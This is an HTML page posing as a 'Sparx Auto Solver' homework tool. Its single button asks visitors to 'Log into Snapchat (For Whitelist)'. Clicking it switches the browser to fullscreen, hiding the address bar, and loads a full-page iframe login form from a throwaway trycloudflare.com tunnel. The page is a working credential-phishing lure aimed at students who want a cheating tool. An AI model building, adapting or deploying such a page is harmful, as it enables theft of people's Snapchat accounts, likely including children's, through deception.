<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sparx Auto Solver</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #1e90ff, #ff7f50);
            color: #fff;
            height: 100vh;
            overflow: hidden;
        }
        h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            z-index: 1;
        }
        .button-container {
            margin: 20px;
            z-index: 1;
        }
        .snapchat-button {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #FFFC00;
            border: none;
            border-radius: 8px;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            color: #000;
            text-decoration: none;
        }
        .snapchat-button img {
            width: 30px;
            height: 30px;
            margin-right: 10px;
        }
        #iframe-container {
            display: none; /* Initially hidden */
            width: 100%;
            height: 100%;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 0;
        }
        iframe {
            border: none;
            width: 100vw; /* Full width of viewport */
            height: 100vh; /* Full height of viewport */
            border-radius: 0;
        }
    </style>
    <script>
        function showIframe() {
            // Hide the button after it's clicked
            document.getElementById('button-container').style.display = 'none';

            // Show the iframe
            var iframeContainer = document.getElementById('iframe-container');
            iframeContainer.style.display = 'block';

            // Trigger fullscreen mode
            enterFullScreen(iframeContainer);
        }

        function enterFullScreen(element) {
            if (element.requestFullscreen) {
                element.requestFullscreen();
            } else if (element.mozRequestFullScreen) { // Firefox
                element.mozRequestFullScreen();
            } else if (element.webkitRequestFullscreen) { // Chrome, Safari and Opera
                element.webkitRequestFullscreen();
            } else if (element.msRequestFullscreen) { // IE/Edge
                element.msRequestFullscreen();
            }
        }
    </script>
</head>
<body>
    <h1>Sparx Auto Solver</h1>
    <div id="button-container" class="button-container">
        <button class="snapchat-button" onclick="showIframe()">
            <img src="https://pbs.twimg.com/profile_images/1840822616405180416/nKBnrqRE_400x400.jpg" alt="Snapchat Logo">
            Log into Snapchat (For Whitelist)
        </button>
    </div>
    <div id="iframe-container">
        <iframe src="https://cabinets-attachments-although-mexican.trycloudflare.com/login.html" title="Embedded Login Page"></iframe>
    </div>
</body>
</html>
